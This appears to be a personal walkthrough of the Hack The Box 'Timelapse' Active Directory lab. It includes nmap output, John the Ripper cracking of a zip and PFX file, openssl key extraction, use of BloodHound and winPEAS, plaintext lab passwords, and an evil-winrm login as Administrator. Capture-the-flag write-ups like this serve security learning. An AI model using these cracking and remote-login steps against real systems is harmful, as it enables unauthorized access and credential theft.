
AD


```sh
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-07-31 17:56:20Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5986/tcp open  ssl/wsmans?
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-25T14:05:29
| Not valid after:  2022-10-25T14:25:29
| MD5:     e233 a199 4504 0859 013f b9c5 e4f6 91c3
| SHA-1:   5861 acf7 76b8 703f d01e e25d fc7c 9952 a447 7652
|_SHA-256: ec04 c023 ef31 4e12 e299 0242 ef00 9045 7626 19ff 2c75 0f04 9779 0f98 118f e81d
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-07-31T17:57:50+00:00; +7h59m55s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-31T17:57:11
|_  start_date: N/A
|_clock-skew: mean: 7h59m54s, deviation: 0s, median: 7h59m54s

```



so smb is open lets check that 

![[Pasted image 20260731115916.png]]

there is a non defualy share 

![[Pasted image 20260731120009.png]]

one zip in dev basically asked for a password so lets try to crack it 

![[Pasted image 20260731120119.png]]


so we cracked it with john the ripper utilities

```sh
#hash the zip
 john-the-ripper.zip2john winrm_backup.zip > hash

#crack it 
 john-the-ripper hash  --wordlist=../rockyou.txt

```

![[Pasted image 20260731125021.png]]

file type is just data 

![[Pasted image 20260731130240.png]]

potential username ? legacyy

![[Pasted image 20260731130417.png]]

searching a bit we understand that we can basically crack that 

```sh
/snap/john-the-ripper/694/bin/pfx2john.py legacyy_dev_auth.pfx > hash 

john ./hash  --wordlist=../../rockyou.txt 


```

![[Pasted image 20260731131242.png]]

 
 thuglegacy 


extract the private key and certificate

```sh

#private key for the cert
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes

#public certificate 
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.pem

```


![[Pasted image 20260731132823.png]]



![[Pasted image 20260731133039.png]]


so first thing first lets drop bloodhound 

nothing 

![[Pasted image 20260731140626.png]]


maybe thats intersting 
![[Pasted image 20260731140852.png]]


dropping winpeas 

![[Pasted image 20260731140832.png]]


there is a local admin enabled

![[Pasted image 20260731140925.png]]


potential password 

![[Pasted image 20260731141121.png]]



E3R$Q62^12p7PLlC%KWaxuaV


we got a domain user 

![[Pasted image 20260731141412.png]]


![[Pasted image 20260731141435.png]]



![[Pasted image 20260731142014.png]]


![[Pasted image 20260731142327.png]]


**note:** 
When a server is **promoted to a Domain Controller**, its local SAM database (where local accounts normally live) is effectively **retired**. The local Administrator account gets migrated into Active Directory and becomes the **domain** Administrator. From that point on, the DC has no usable separate local admin  logging in as "Administrator" on a DC logs you into the domain Administrator account. So for a DC specifically, "local admin" and "domain admin" collapse into the same account.

why i mentioned that since laps dumps local passwords 


```sh
evil-winrm -i 10.129.227.113  -u Administrator@timelapse.htb -p 'A.Q/MQnxPLH.0M&1.V7%;+;l' -S

```

flag is in TRX


DONE